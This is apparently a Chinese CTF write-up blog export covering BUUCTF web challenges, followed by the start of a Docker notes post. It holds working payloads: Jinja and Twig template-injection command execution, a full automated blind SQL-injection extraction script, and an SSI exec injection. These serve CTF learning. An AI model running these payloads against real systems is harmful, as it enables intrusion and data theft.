href="#jinjaSSTI" class="headerlink" title="jinjaSSTI"></a>jinjaSSTI</h3><p>题目明确告诉我们是ssti，直接测试即可</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210610141252155.png" alt="image-20210610141252155"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">7</span><span class="token operator">*</span><span class="token string">'7'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210610141319023.png" alt="image-20210610141319023"></p><p>确定为jinja框架</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwNTEyMTcyNDM1OTgxLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3dhdGVybWFyayx0eXBlX1ptRnVaM3BvWlc1bmFHVnBkR2ssc2hhZG93XzEwLHRleHRfYUhSMGNITTZMeTlpYkc5bkxtTnpaRzR1Ym1WMEwzRnhYelF4TmpJNE5qWTUsc2l6ZV8xNixjb2xvcl9GRkZGRkYsdF83MA?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><p>判断方法还是这个经典的图</p><p>这里我直接贴payload</p><pre class="line-numbers language-python"><code class="language-python">?password<span class="token operator">=</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token string">""</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> a<span class="token punctuation">.</span>__name__ <span class="token operator">==</span> <span class="token string">"_wrap_close"</span> <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> a<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__ <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token string">"popen"</span> <span class="token keyword">in</span> b <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>a<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cd app;cat server.py'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210610141724850.png" alt="image-20210610141724850"></p><p>payload的构造方法我在SSTI中已经说过，这里不做赘述</p><h3 id="flag-23"><a href="#flag-23" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">n1book{eddb84d69a421a82}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h3 id="TwigSSTI"><a href="#TwigSSTI" class="headerlink" title="TwigSSTI"></a>TwigSSTI</h3><p>在flag.php位置有输入框，在这里测试，发现有服务器端模板注入</p><p>测试发现是Twig模板</p><p><img src="image-20210610144024655.png" alt="image-20210610144024655"></p><p>这个可以直接写payload到输入框，也可以注cookie中，题目本意是注cookie中</p><pre class="line-numbers language-php"><code class="language-php"><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token function">registerUndefinedFilterCallback</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token punctuation">{</span>_self<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同样在SSTI中说明过，不在此重新说明</p><p><img src="image-20210610144902221.png" alt="image-20210610144902221"></p><h3 id="flag-24"><a href="#flag-24" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{aa34f4b3-dea5-4163-9f3d-feab7e00edd3}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>很简单的sql注入，除了过滤的很严格，不过还好给了列名和表名，不然得用无列名注入还是很麻烦的</p><p><img src="image-20210610194618203.png" alt="image-20210610194618203"></p><p>直接盲注就可以，payload是1=(1=1)=1</p><p>顺便贴个我写的小脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#作者：Atmujie</span><span class="token comment" spellcheck="true">#转载使用请注明出处</span><span class="token comment" spellcheck="true">#from bs4 import BeautifulSoup</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">import</span> time<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token triple-quoted-string string">'''如需用header/data,请到res_get/post函数自行添加'''</span><span class="token comment" spellcheck="true">#自定义项</span><span class="token comment" spellcheck="true">#url</span>url <span class="token operator">=</span> <span class="token string">"http://b1e10c66-2481-426d-a94b-2285770056b5.node3.buuoj.cn/index.php"</span> <span class="token comment" spellcheck="true">#get传参时请将?id等放在这里</span><span class="token comment" spellcheck="true"># 传参接口，get/post</span>request_q <span class="token operator">=</span> <span class="token string">"post"</span> <span class="token comment" spellcheck="true">#sql闭合方式,判断符号（and or || &amp;&amp;）也写在这里</span>id <span class="token operator">=</span> <span class="token string">"1=(1="</span><span class="token comment" spellcheck="true"># sql查询语句</span><span class="token comment" spellcheck="true"># code = "database()" </span><span class="token comment" spellcheck="true"># code = "substr(select(concat(schema_name))from(information_schema.schemata))"</span><span class="token comment" spellcheck="true"># code = "select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"</span><span class="token comment" spellcheck="true"># code = "select(group_concat(column_name))from(information_schema.columns)where(table_name='loflag')"</span>code <span class="token operator">=</span> <span class="token string">"substr((select(concat(flag))from(ctftraining.flag)),1,68)"</span><span class="token comment" spellcheck="true">#闭合过滤方式（#/--+/;%00）</span><span class="token comment" spellcheck="true">#post传参需注入此处编码</span><span class="token comment" spellcheck="true">#get传参无需对#url编码，本脚本已经自行编码</span>filt <span class="token operator">=</span> <span class="token string">")=1"</span><span class="token comment" spellcheck="true">#判断方式（if "judgment" in qingqiu）</span>judgment <span class="token operator">=</span> <span class="token string">"Hello, glzjin wants a girlfriend."</span><span class="token comment" spellcheck="true">#单字符过滤,自行添加</span>guolv <span class="token operator">=</span> <span class="token string">"*+.?|$"</span><span class="token comment" spellcheck="true"># 括号是否被过滤/拦截（yes/no默认为no）</span>brackets <span class="token operator">=</span> <span class="token string">"no"</span><span class="token comment" spellcheck="true">#代码参考</span><span class="token triple-quoted-string string">'''"{ids}"+"left(({codes}),{ints}) regexp binary({tmp}){filts}"id=1'||  left((database()),1)   regexp binary(0x5e73) --+ '''</span><span class="token comment" spellcheck="true">#get传参模块</span><span class="token keyword">def</span> <span class="token function">res_get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>code_q<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true"># get传参head</span>    head <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    payload <span class="token operator">=</span> url<span class="token operator">+</span>code_q    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 需要head自行添加</span>    <span class="token keyword">return</span> res<span class="token comment" spellcheck="true">#post传参模块b</span><span class="token keyword">def</span> <span class="token function">res_post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>code_q<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#post传参data</span>    data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token operator">+</span>code_q    <span class="token punctuation">}</span><span class="token punctuation">;</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token comment" spellcheck="true">#输出匹配字符16进制</span><span class="token keyword">def</span> <span class="token function">HexStr</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>     result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> tmp <span class="token keyword">in</span> string<span class="token punctuation">:</span>        result <span class="token operator">+=</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">)</span>    result <span class="token operator">=</span> result<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"0x"</span><span class="token operator">+</span>result<span class="token comment" spellcheck="true">#主函数</span><span class="token comment" spellcheck="true">#打印所有字符串</span>str_s <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">.</span>printable <span class="token operator">+</span> <span class="token string">"”"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#url过滤字符</span><span class="token keyword">if</span> request_q <span class="token operator">==</span> <span class="token string">"get"</span> <span class="token operator">and</span> filt <span class="token operator">==</span> <span class="token string">"#"</span><span class="token punctuation">:</span>      filt <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote_plus<span class="token punctuation">(</span>filt<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"盲注开始"</span><span class="token punctuation">)</span>    text <span class="token operator">=</span> str<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span>    zhi <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    ESC <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true">#循环盲注</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> ESC <span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> strs <span class="token keyword">in</span> str_s<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true">#去除过滤项</span>                    <span class="token keyword">if</span> strs <span class="token keyword">in</span> guolv<span class="token punctuation">:</span>                        <span class="token keyword">continue</span>                    <span class="token comment" spellcheck="true">#设定正则表达式</span>                    tmp_hex <span class="token operator">=</span> HexStr<span class="token punctuation">(</span><span class="token string">'^'</span><span class="token operator">+</span>text<span class="token operator">+</span>strs<span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#输入语句</span>                    <span class="token keyword">if</span> brackets <span class="token operator">==</span> <span class="token string">"no"</span><span class="token punctuation">:</span>                           code_q <span class="token operator">=</span> <span class="token string">"{ids}left(({codes}),{ints})regexp(binary({tmp})){filts}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ids<span class="token operator">=</span>id<span class="token punctuation">,</span>codes<span class="token operator">=</span>code<span class="token punctuation">,</span>ints<span class="token operator">=</span>i<span class="token punctuation">,</span>tmp<span class="token operator">=</span>tmp_hex<span class="token punctuation">,</span>filts<span class="token operator">=</span>filt<span class="token punctuation">)</span>                    <span class="token keyword">else</span><span class="token punctuation">:</span>                        exit<span class="token punctuation">(</span><span class="token string">"请重新定义输入语句或使用 order by 盲注,本脚本目前无 order by 模块"</span><span class="token punctuation">)</span>                    <span class="token keyword">if</span> request_q <span class="token operator">==</span> <span class="token string">"get"</span><span class="token punctuation">:</span>                        qingqiu <span class="token operator">=</span> res_get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>code_q<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    <span class="token keyword">elif</span> request_q <span class="token operator">==</span> <span class="token string">"post"</span><span class="token punctuation">:</span>                        qingqiu <span class="token operator">=</span> res_post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>code_q<span class="token punctuation">)</span><span class="token punctuation">.</span>text                    <span class="token comment" spellcheck="true"># print(qingqiu)</span>                    <span class="token comment" spellcheck="true"># #输出结果</span>                    <span class="token comment" spellcheck="true"># qingqiu = len(qingqiu) #长度判断</span>                    <span class="token keyword">if</span> judgment <span class="token keyword">in</span> qingqiu <span class="token punctuation">:</span>                        text <span class="token operator">+=</span> strs                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"检测成功，当前结果为"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span>                        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>                        <span class="token keyword">break</span>                                 <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                    exit<span class="token punctuation">(</span><span class="token string">"未知错误,请检查脚本或网络"</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> strs <span class="token operator">==</span> <span class="token string">"”"</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"盲注测试结束"</span><span class="token punctuation">)</span>                exit<span class="token punctuation">(</span><span class="token string">"结果为:{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有改进的余地，以后在改</p><h3 id="flag-25"><a href="#flag-25" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{88f0a9e3-8a5b-493a-8475-980748a3d658}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="render模板注入"><a href="#render模板注入" class="headerlink" title="render模板注入"></a>render模板注入</h3><p>tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过双花括号进行传递变量和执行简单的表达式。</p><p>本题在error报错处，可以执行模板注入</p><p><img src="image-20210610170423305.png" alt="image-20210610170423305"></p><p>不过过滤很严格，打不进去的我搜了wp</p><p>没看懂，问了学长</p><p>这里说学长的思路</p><h3 id="官方文档查看思路"><a href="#官方文档查看思路" class="headerlink" title="官方文档查看思路"></a>官方文档查看思路</h3><p>首先看一下题目在问什么，这里告诉我们是cookie</p><p><img src="image-20210611213200217.png" alt="image-20210611213200217"></p><p>这里告诉我们filehash的编码方式，是将cookie_sercret和md5编码后的filename连接</p><p>先看看cookie_sercret官方文档怎么说</p><p><img src="image-20210611213350455.png" alt="image-20210611213350455"></p><p>我们知道了这事一个密码，并且可以在应用程序中设置</p><p>然后题目还提示了render</p><p><img src="image-20210611214103470.png" alt="image-20210611214103470"></p><p>看看文档怎么说</p><p><img src="image-20210611214147887.png" alt="image-20210611214147887"></p><p><img src="image-20210611214206063.png" alt="image-20210611214206063"></p><p>选几个试一试</p><p><img src="image-20210611214254580.png" alt="image-20210611214254580"></p><p>这说明入手点没有错，然后找render和cookie_sercert的联系</p><p>经过很多很多次的看函数看源码，最后找到了srettings</p><p><img src="image-20210611215704845.png" alt="image-20210611215704845"></p><p>前面图里有行字，不知道大家有没有印象</p><p><img src="image-20210611220133016.png" alt="image-20210611220133016"></p><p>试试：</p><p><img src="image-20210611220255253.png" alt="image-20210611220255253"></p><p>092d4bfe-0a2b-4507-bf74-65da729654c1</p><p>后面就好办了，根据提示写个脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> hashlibhash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>filename<span class="token operator">=</span><span class="token string">'/fllllllllllllag'</span>cookie_secret<span class="token operator">=</span><span class="token string">"092d4bfe-0a2b-4507-bf74-65da729654c1"</span>hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span>filename<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>s1<span class="token operator">=</span>hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>hash <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>hash<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>s1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hash<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行，访问</p><p><img src="image-20210611220513187.png" alt="image-20210611220513187"></p><p>得到flag</p><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><pre class="line-numbers language-html"><code class="language-html">file?filename=/fllllllllllllag&amp;filehash=bf5ae3e09832e8575c20f84dfee458d6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="flag-26"><a href="#flag-26" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{2d81502b-03f5-4e6b-bac4-d2ccbe1e7ca8}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><h3 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h3><p>CTF中源码泄露是一件很常见的事情，趁着这道题，我顺便来说一下源码泄露常见的类型</p><h4 id="git源码泄露"><a href="#git源码泄露" class="headerlink" title=".git源码泄露"></a>.git源码泄露</h4><p>这种泄露在博客中很常见，只要挂载了github远程仓库，就一定有.git文件，区别只是它被藏在了哪里</p><p>除非搭建好博客，顺手删了.git文件，并大喊我不更新了</p><p>找到.git目录位置，用GitHack工具dump下来，就可以得到部分源码</p><h4 id="ds-store"><a href="#ds-store" class="headerlink" title=".ds_store"></a>.ds_store</h4><p>这个我记得我在之前提到过，它包含了文件夹的目录信息</p><p>当然，穷人不配.ds_store泄露，这是MAC电脑专属的</p><h4 id="备份压缩文件"><a href="#备份压缩文件" class="headerlink" title="备份压缩文件"></a>备份压缩文件</h4><p>常见备份文件后缀</p><blockquote><p>.rar<br>.zip<br>.7z<br>.tar.gz<br>.bak<br>.swp<br>.txt<br>.html</p></blockquote><p>这个说起来，我想基本每个人都有备份的习惯，一般都是右击，然后发送为zip文件</p><p>CTF做的多了，大家应该都知道<a href="http://www.zip，因为这是所有程序员最爱用的？">www.zip，因为这是所有程序员最爱用的？</a></p><p>可能有人会杠，我不爱用这个名字，那我们分析一下</p><p>linux系统，以及apache,网页常用路径是这个 /var/www/html</p><p>www，正是第二级文件夹</p><p>我们备份一般有两种选择，一是备份整个文件夹，二是只备份指定项目，我想不管是哪个，应该没多少人备份完会改备份文件的名字吧，毕竟一来文件多了，备份改名一时爽，某日找备份火葬场</p><p>综上，大多数人备份，都不改名</p><p>这样有什么后果呢？举两个例子</p><p>win备份</p><p><img src="image-20210614152551352.png" alt="image-20210614152551352"></p><p><img src="image-20210614152609428.png" alt="image-20210614152609428"></p><p>看，备份后的zip文件名就是目录名，不管用什么压缩软件，结果都一样。</p><p>linux备份</p><p><img src="image-20210614152906509.png" alt="image-20210614152906509"></p><p>这里为什么一样呢？</p><p>你按一下 Tab 就能自动补全的事情，你会自己起一个名字？不会吧</p><p>结论出来了，大多数人备份文件，从不改名吗，基本文件夹名或者文件名就是备份名，所以我们只要知道文件名，很轻易就能得到源码备份，CTF的<a href="http://www.zip就是这个道理,当然ctf里一般是故意改成这名的,平时见到的就是`项目文件夹名.备份后缀`/">www.zip就是这个道理，当然CTF里一般是故意改成这名的，平时见到的就是`项目文件夹名.备份后缀`</a></p><p>一般配合目录穿越漏洞使用，不过实际中可用目录爆破的方式得到备份，所以大家都不是很在意这个问题，根本不用费心思想为什么</p><p>——————————言归正传——————————</p><p>本题就存在源码泄露</p><p><img src="image-20210614153937479.png" alt="image-20210614153937479"></p><p>就像我说的，配合目录穿越查看</p><p>这步我字典拉跨了没扫到，看wp，都没提到目录穿越这回事，学长憨憨的访问了半天，最后说题崩了（笑）</p><p>备份文件，肯定不会在文件夹里，那怕不是备份个寂寞</p><h3 id="MD5值爆破"><a href="#MD5值爆破" class="headerlink" title="MD5值爆破"></a>MD5值爆破</h3><p>这步没什么好说的</p><p><img src="image-20210614154738896.png" alt="image-20210614154738896"></p><p>要求password md5加密后为指定值，直接爆破</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token string">'6d0bc1'</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token constant">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$admin</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：code=<strong>2020666</strong></p><h3 id="SSI注入"><a href="#SSI注入" class="headerlink" title="SSI注入"></a>SSI注入</h3><p>审计源码我们可以看到如下操作</p><p><img src="image-20210614155121020.png" alt="image-20210614155121020"></p><p>post传入的username 被写入了.shtml文件，然后命名为一串毫无意义的字符串</p><p>先看看shtml文件是什么</p><p><img src="image-20210614155532096.png" alt="image-20210614155532096"></p><p>这里就很明确了，SSI注入</p><p>我直接贴payload了，具体用法自行百度</p><pre class="line-numbers language-payload"><code class="language-payload">password=2020666&username=<!--#exec cmd="cat ../flag_990c66bf85a09c664f0b6741840499b2"--><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在这个名字奇奇怪怪的文件里，应该都看的懂</p><p>然后看看Network，找到保存的路径（这步简直毫无意义）</p><p><img src="image-20210614155955267.png" alt="image-20210614155955267"></p><p>访问它，得到flag</p><p><img src="image-20210614160021581.png" alt="image-20210614160021581"></p><h3 id="flag-27"><a href="#flag-27" class="headerlink" title="flag"></a>flag</h3><pre class="line-numbers language-flag"><code class="language-flag">flag{bb20a263-400d-4289-952d-5fe000b815fe}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="来自后话"><a href="#来自后话" class="headerlink" title="来自后话"></a>来自后话</h2><p>本来打算把BUU所有题目都写一起，可不知不觉就写了很多，以至于我自己查阅都很麻烦，所以干脆到此为止，我另开几篇新文章继续写，写成一个序列</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker基础学习</title>
      <link href="/2021/04/03/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/04/03/docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Docker基础学习"><a href="#Docker基础学习" class="headerlink" title="Docker基础学习"></a>Docker基础学习</h1><h2 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h2><blockquote><p> 官网打开docs，按流程操作即可，不做赘述</p></blockquote><h3 id="Docker-run-运行原理"><a href="#Docker-run-运行原理" class="headerlink" title="Docker run 运行原理"></a>Docker run 运行原理</h3><p><img src="image-20210407200440453.png" alt="image-20210407200440453"></p><h2 id="Docker命令"><a href="#Docker命令" class="headerlink" title="Docker命令"></a>Docker命令</h2><h3 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h3><h4 id="docker-version命令"><a href="#docker-version命令" class="headerlink" title="docker  version命令"></a>docker  version命令</h4><blockquote><p>译为：docker 版本</p><p>查看当前docker的版本信息</p></blockquote><h4 id="docker-info命令"><a href="#docker-info命令" class="headerlink" title="docker info命令"></a>docker info命令</h4><blockquote><p>译为： docker 信息</p><p>查看docker的全部信息，包括镜像和容器的数量</p></blockquote><h4 id="docker-–help命令"><a href="#docker-–help命令" class="headerlink" title="docker –help命令"></a>docker –help命令</h4><blockquote><p>查看docker的帮助信息</p></blockquote><h3 id="镜像命令"><a href="#镜像命令" class="headerlink" title="镜像命令"></a>镜像命令</h3><h4 id="docker-images-显示镜像命令"><a href="#docker-images-显示镜像命令" class="headerlink" title="docker images 显示镜像命令"></a>docker images 显示镜像命令</h4><blockquote><p>image 译为：形象，镜像</p><p>查询镜像</p><p>选项</p><blockquote><p><strong>-a  / –all  显示所有镜像</strong></p><p>​        <strong>–digests</strong> 显示摘要</p><p><strong>-f  显示满足条件的镜像；</strong></p><p>​        **–format :**指定返回值的模板文件；</p><p>​          **–no-trunc :**显示完整的镜像信息；</p><p><strong>-q :只显示镜像ID</strong></p></blockquote></blockquote><h4 id="docker-search-查找镜像命令"><a href="#docker-search-查找镜像命令" class="headerlink" title="docker search 查找镜像命令"></a>docker search 查找镜像命令</h4><blockquote><p>search 译为：搜索</p><p><strong>用于从Docker Hub查找镜像</strong></p><p>选项：</p><blockquote><p><strong>-f : 根据提供的条件过滤输出</strong></p><p>​        <strong>–format string</strong> 使用Go模板格式化字符串打印搜索</p></blockquote><p>参数说明：</p><blockquote><p><strong>NAME:</strong> 镜像仓库源的名称</p><p><strong>DESCRIPTION:</strong> 镜像的描述</p><p><strong>OFFICIAL:</strong> 是否 docker 官方发布</p><p><strong>stars:</strong> 类似 Github 里面的 star，表示点赞、喜欢的意思。</p><p><strong>AUTOMATED:</strong> 自动构建。</p></blockquote></blockquote><h4 id="docker-pull-下载镜像命令"><a href="#docker-pull-下载镜像命令" class="headerlink" title="docker pull 